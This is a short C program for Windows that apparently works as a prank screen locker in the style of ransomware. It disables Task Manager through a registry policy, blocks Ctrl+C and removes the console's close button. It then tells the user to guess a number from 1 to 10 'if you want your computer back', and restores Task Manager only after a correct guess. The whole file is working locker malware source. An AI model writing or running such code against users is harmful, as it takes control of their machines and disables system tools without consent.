#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <time.h>

void kill_taskman() {
    HKEY hKey;
    DWORD value = 1;
    RegCreateKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 0, 0, 0, KEY_WRITE, 0, &hKey, 0);
    RegSetValueExA(hKey, "DisableTaskMgr", 0, REG_DWORD, (BYTE*)&value, sizeof(value));
    RegCloseKey(hKey);
}

void resurect_taskman() {
    HKEY hKey;
    RegOpenKeyExA(HKEY_CURRENT_USER,
        "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 0, KEY_WRITE, &hKey);
    RegDeleteValueA(hKey, "DisableTaskMgr");
    RegCloseKey(hKey);
}

BOOL WINAPI ctrlHandler(DWORD type) {
    return TRUE;
}

void console_lock() {
    HWND console = GetConsoleWindow();
    ShowWindow(console, SW_MAXIMIZE);
    SetWindowLong(console, GWL_STYLE, GetWindowLong(console, GWL_STYLE) & ~WS_SYSMENU); // Remove [X]
}

int main() {
    SetConsoleTitleA("Screen");
    SetConsoleCtrlHandler(ctrlHandler, TRUE);
    console_lock();
    kill_taskman();

    srand((unsigned int)time(0));
    int key = (rand() % 10) + 1;
    int guess = 0;

    printf("===Let's Play a little Game===\n");
    printf("if you want your computer back...\n");
    printf("than guess the number\n");
    while (1) {
        printf("Enter guess 1-10 >:\n");
        scanf("%d", &guess);
        if (guess == key) {
            printf("\nYou Won!!! woohoo\n");
            resurect_taskman();
            exit(0);
        }
        else {
            printf("\nwrong\n");
        }
    }
    Sleep(3000);
    return 0;
}
// 0 = NULL